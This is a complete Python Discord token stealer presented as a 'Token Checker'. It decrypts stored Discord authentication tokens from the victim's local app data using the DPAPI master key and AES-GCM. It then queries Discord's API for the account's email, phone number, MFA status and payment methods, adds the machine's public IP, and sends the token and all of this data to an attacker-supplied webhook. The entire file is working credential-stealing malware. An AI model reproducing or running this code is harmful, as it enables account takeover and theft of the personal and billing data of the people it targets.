import os
import re
import base64
import json
import requests
from win32crypt import CryptUnprotectData
from Crypto.Cipher import AES
from datetime import datetime

LOCAL = os.getenv("LOCALAPPDATA")
ROAMING = os.getenv("APPDATA")

PATHS = {
    "Discord": ROAMING + "\\discord",
    "Discord Canary": ROAMING + "\\discordcanary",
    "Discord PTB": ROAMING + "\\discordptb",
}

def decrypt(buff, master_key):
    try:
        master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        return cipher.decrypt(payload)[:-16].decode()
    except Exception as e:
        return None

def get_master_key(path):
    with open(path + "\\Local State", "r") as f:
        local_state = f.read()
    local_state = json.loads(local_state)
    master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    return master_key[5:]

def get_tokens(path):
    tokens = []
    for file_name in os.listdir(path + "\\Local Storage\\leveldb\\"):
        if not file_name.endswith(".ldb") and not file_name.endswith(".log"):
            continue
        with open(path + f"\\Local Storage\\leveldb\\{file_name}", "r", errors="ignore") as file:
            for line in file:
                for token in re.findall(r"dQw4w9WgXcQ:[^\"]+", line.strip()):
                    tokens.append(token)
    return tokens

def validate_token_with_discord(token):
    headers = {'Authorization': token}
    try:
        response = requests.get('https://discord.com/api/v9/users/@me', headers=headers)
        if response.status_code == 200:
            user_info = response.json()
            return True, user_info
    except Exception as e:
        print(f"Error validating token with Discord: {e}")
    return False, None

def get_ip():
    try:
        response = requests.get("https://api.ipify.org?format=json")
        if response.status_code == 200:
            return response.json()["ip"]
    except Exception as e:
        print(f"Error fetching IP address: {e}")
    return "N/A"

def get_nitro_info(user_info):
    premium_type = user_info.get('premium_type', 0)
    has_nitro = premium_type in [1, 2]  # 1: Nitro Classic, 2: Nitro
    return has_nitro

def get_payment_info(token):
    headers = {'Authorization': token}
    try:
        response = requests.get('https://discord.com/api/v9/users/@me/billing/payment-sources', headers=headers)
        if response.status_code == 200:
            payment_sources = response.json()
            payment_methods = []
            for source in payment_sources:
                if source.get("type") == 1:
                    payment_methods.append("💳 Credit Card")
                elif source.get("type") == 2:
                    payment_methods.append("🏦 PayPal")
            return payment_methods if payment_methods else None
    except Exception as e:
        print(f"Error fetching payment info: {e}")
    return None

def send_to_webhook(webhook_url, embed):
    payload = {
        "embeds": [embed]
    }
    headers = {
        "Content-Type": "application/json"
    }
    response = requests.post(webhook_url, json=payload, headers=headers)
    if response.status_code == 204:
        print("Information successfully sent to webhook.")
    else:
        print(f"Failed to send information to webhook. Status code: {response.status_code}")

def create_embed(token, user_info, ip_address, has_nitro, payment_methods):
    user_id = user_info['id']
    username = f"{user_info['username']}#{user_info['discriminator']}"
    avatar_url = f"https://cdn.discordapp.com/avatars/{user_id}/{user_info['avatar']}.png"
    email = user_info.get('email', 'N/A')
    phone = user_info.get('phone', 'N/A')
    mfa_enabled = user_info.get('mfa_enabled', False)
    nitro_status = "Yes" if has_nitro else "No"

    description = (
        f"**👤 Username:** {username}\n"
        f"**🆔 User ID:** `{user_id}`\n"
        f"**📧 Email:** `{email}`\n"
        f"**📱 Phone:** `{phone}`\n"
        f"**🔒 MFA Enabled:** {'✅ Enabled' if mfa_enabled else '❌ Disabled'}\n"
        f"**🚀 Has Nitro:** {nitro_status}\n"
        f"**🌐 IP Address:** `{ip_address}`\n"
        f"**🔑 Token:** `{token}`"
    )

    if payment_methods:
        description += f"\n**💳 Payment Methods:** {', '.join(payment_methods)}"

    embed = {
        "title": "🔍 Discord Account Information",
        "color": 0x7289DA,
        "description": description,
        "thumbnail": {"url": avatar_url},
        "footer": {
            "text": f"Generated on {datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S UTC')}",
            "icon_url": "https://cdn.discordapp.com/emojis/784204725012914206.png"
        },
        "author": {
            "name": "Discord Token Checker",
            "icon_url": "https://cdn.discordapp.com/icons/815123084343066695/9e6e1bc04291fcb3a1e98db26b6f7bb4.png"
        }
    }
    return embed

def main():
    webhook_url = "webhook here"  # Replace with your webhook URL
    ip_address = get_ip()
    found_tokens = set()  # Using a set to avoid duplicates
    for platform_name, path in PATHS.items():
        if not os.path.exists(path):
            continue
        print(f"Checking {platform_name}...")
        master_key = get_master_key(path)
        if master_key:
            tokens = get_tokens(path)
            for token in tokens:
                decrypted_token = decrypt(base64.b64decode(token.split('dQw4w9WgXcQ:')[1]), master_key)
                if decrypted_token and decrypted_token not in found_tokens:
                    is_valid, user_info = validate_token_with_discord(decrypted_token)
                    if is_valid:
                        found_tokens.add(decrypted_token)
                        has_nitro = get_nitro_info(user_info)
                        payment_methods = get_payment_info(decrypted_token)
                        embed = create_embed(decrypted_token, user_info, ip_address, has_nitro, payment_methods)
                        send_to_webhook(webhook_url, embed)

if __name__ == "__main__":
    main()
